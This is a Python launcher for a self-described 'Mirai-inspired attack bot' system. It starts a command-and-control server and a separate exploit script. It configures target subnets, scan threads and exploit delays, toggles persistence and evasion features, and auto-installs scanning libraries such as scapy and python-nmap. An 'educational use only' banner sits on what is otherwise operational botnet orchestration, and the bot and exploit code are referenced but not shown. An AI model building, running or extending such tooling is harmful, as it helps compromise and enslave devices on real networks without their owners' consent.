#!/usr/bin/env python3
"""
Attack Bot System Launcher
Educational/Research Purpose Only

This launcher provides an easy interface to start the attack bot system
with different configurations and modes.
"""

import sys
import os
import subprocess
import argparse
import json
from datetime import datetime

class BotLauncher:
    def __init__(self):
        self.base_dir = os.path.dirname(os.path.abspath(__file__))
        self.config_file = os.path.join(self.base_dir, 'bot_config.json')
        self.default_config = {
            'c2_host': '127.0.0.1',
            'c2_port': 8080,
            'scan_threads': 50,
            'scan_timeout': 5,
            'exploit_delay': [1, 3],
            'persistence_enabled': True,
            'evasion_enabled': True,
            'target_ranges': [
                '192.168.1.0/24',
                '192.168.0.0/24'
            ]
        }
    
    def load_config(self):
        """Load configuration from file"""
        try:
            if os.path.exists(self.config_file):
                with open(self.config_file, 'r') as f:
                    return json.load(f)
            else:
                self.save_config(self.default_config)
                return self.default_config
        except Exception as e:
            print(f"[!] Error loading config: {e}")
            return self.default_config
    
    def save_config(self, config):
        """Save configuration to file"""
        try:
            with open(self.config_file, 'w') as f:
                json.dump(config, f, indent=2)
            print(f"[*] Configuration saved to {self.config_file}")
        except Exception as e:
            print(f"[!] Error saving config: {e}")
    
    def show_banner(self):
        """Display system banner"""
        banner = """
╔══════════════════════════════════════════════════════════════╗
║                    MIRAI-INSPIRED ATTACK BOT                 ║
║                  Educational/Research Use Only               ║
╠══════════════════════════════════════════════════════════════╣
║  WARNING: This tool is for educational and research          ║
║  purposes only. Unauthorized access to computer systems      ║
║  is illegal and unethical. Use responsibly!                  ║
╚══════════════════════════════════════════════════════════════╝
        """
        print(banner)
    
    def check_dependencies(self):
        """Check if all required dependencies are installed"""
        print("[*] Checking dependencies...")
        
        required_modules = [
            'requests', 'psutil', 'python-nmap', 'colorama', 
            'cryptography', 'scapy'
        ]
        
        missing_modules = []
        for module in required_modules:
            try:
                __import__(module.replace('-', '_'))
            except ImportError:
                missing_modules.append(module)
        
        if missing_modules:
            print(f"[!] Missing modules: {', '.join(missing_modules)}")
            print("[*] Installing missing dependencies...")
            subprocess.run([sys.executable, '-m', 'pip', 'install'] + missing_modules)
        else:
            print("[+] All dependencies are installed")
    
    def launch_c2_server(self, config):
        """Launch the C2 server"""
        c2_script = os.path.join(os.path.dirname(self.base_dir), 'c2_server', 'c2_server.py')
        
        if not os.path.exists(c2_script):
            print(f"[!] C2 server script not found: {c2_script}")
            return None
        
        print(f"[*] Starting C2 server on {config['c2_host']}:{config['c2_port']}")
        
        cmd = [
            sys.executable, c2_script,
            '--host', config['c2_host'],
            '--port', str(config['c2_port'])
        ]
        
        try:
            process = subprocess.Popen(cmd, cwd=os.path.dirname(c2_script))
            print(f"[+] C2 server started with PID: {process.pid}")
            return process
        except Exception as e:
            print(f"[!] Failed to start C2 server: {e}")
            return None
    
    def launch_bot(self, config, mode='auto'):
        """Launch the attack bot"""
        exploit_script = os.path.join(self.base_dir, 'exploit.py')
        
        print(f"[*] Starting attack bot in {mode} mode")
        
        cmd = [
            sys.executable, exploit_script,
            '--c2-host', config['c2_host'],
            '--c2-port', str(config['c2_port']),
            '--mode', mode
        ]
        
        if not config.get('persistence_enabled', True):
            cmd.append('--no-persistence')
        
        if not config.get('evasion_enabled', True):
            cmd.append('--no-evasion')
        
        try:
            if mode == 'interactive':
                # Run interactively
                subprocess.run(cmd, cwd=self.base_dir)
            else:
                # Run in background
                process = subprocess.Popen(cmd, cwd=self.base_dir)
                print(f"[+] Attack bot started with PID: {process.pid}")
                return process
        except Exception as e:
            print(f"[!] Failed to start attack bot: {e}")
            return None
    
    def interactive_config(self):
        """Interactive configuration setup"""
        print("\n=== Configuration Setup ===")
        config = self.load_config()
        
        print(f"Current C2 Host: {config['c2_host']}")
        new_host = input("Enter new C2 host (or press Enter to keep current): ").strip()
        if new_host:
            config['c2_host'] = new_host
        
        print(f"Current C2 Port: {config['c2_port']}")
        new_port = input("Enter new C2 port (or press Enter to keep current): ").strip()
        if new_port:
            try:
                config['c2_port'] = int(new_port)
            except ValueError:
                print("[!] Invalid port number")
        
        print(f"Current scan threads: {config['scan_threads']}")
        new_threads = input("Enter scan threads (or press Enter to keep current): ").strip()
        if new_threads:
            try:
                config['scan_threads'] = int(new_threads)
            except ValueError:
                print("[!] Invalid thread count")
        
        # Enable/disable features
        config['persistence_enabled'] = input("Enable persistence mechanisms? [Y/n]: ").lower() != 'n'
        config['evasion_enabled'] = input("Enable evasion techniques? [Y/n]: ").lower() != 'n'
        
        self.save_config(config)
        return config
    
    def show_status(self):
        """Show system status"""
        print("\n=== System Status ===")
        
        # Check if C2 server is running
        try:
            import requests
            config = self.load_config()
            response = requests.get(f"http://{config['c2_host']}:{config['c2_port']}/status", timeout=5)
            if response.status_code == 200:
                print("[+] C2 Server: Online")
            else:
                print("[-] C2 Server: Offline")
        except:
            print("[-] C2 Server: Offline")
        
        # Show configuration
        config = self.load_config()
        print(f"C2 Host: {config['c2_host']}")
        print(f"C2 Port: {config['c2_port']}")
        print(f"Persistence: {'Enabled' if config['persistence_enabled'] else 'Disabled'}")
        print(f"Evasion: {'Enabled' if config['evasion_enabled'] else 'Disabled'}")
    
    def run(self):
        """Main launcher interface"""
        self.show_banner()
        
        parser = argparse.ArgumentParser(description='Attack Bot System Launcher')
        parser.add_argument('--mode', choices=['auto', 'interactive', 'c2-only', 'config', 'status'], 
                          default='interactive', help='Launch mode')
        parser.add_argument('--check-deps', action='store_true', help='Check and install dependencies')
        parser.add_argument('--no-c2', action='store_true', help='Don\'t start C2 server')
        
        args = parser.parse_args()
        
        if args.check_deps:
            self.check_dependencies()
            return
        
        if args.mode == 'config':
            self.interactive_config()
            return
        
        if args.mode == 'status':
            self.show_status()
            return
        
        config = self.load_config()
        
        if args.mode == 'c2-only':
            self.launch_c2_server(config)
            input("\nPress Enter to stop C2 server...")
            return
        
        # Start C2 server first (unless disabled)
        c2_process = None
        if not args.no_c2:
            c2_process = self.launch_c2_server(config)
            if not c2_process:
                print("[!] Failed to start C2 server. Continue anyway? [y/N]")
                if input().lower() != 'y':
                    return
        
        # Start attack bot
        try:
            if args.mode == 'interactive':
                self.launch_bot(config, 'interactive')
            else:
                bot_process = self.launch_bot(config, 'auto')
                if bot_process:
                    print("\n[*] System running. Press Ctrl+C to stop.")
                    try:
                        bot_process.wait()
                    except KeyboardInterrupt:
                        print("\n[*] Stopping system...")
                        bot_process.terminate()
        finally:
            # Clean up C2 server
            if c2_process:
                print("[*] Stopping C2 server...")
                c2_process.terminate()

if __name__ == "__main__":
    launcher = BotLauncher()
    launcher.run()
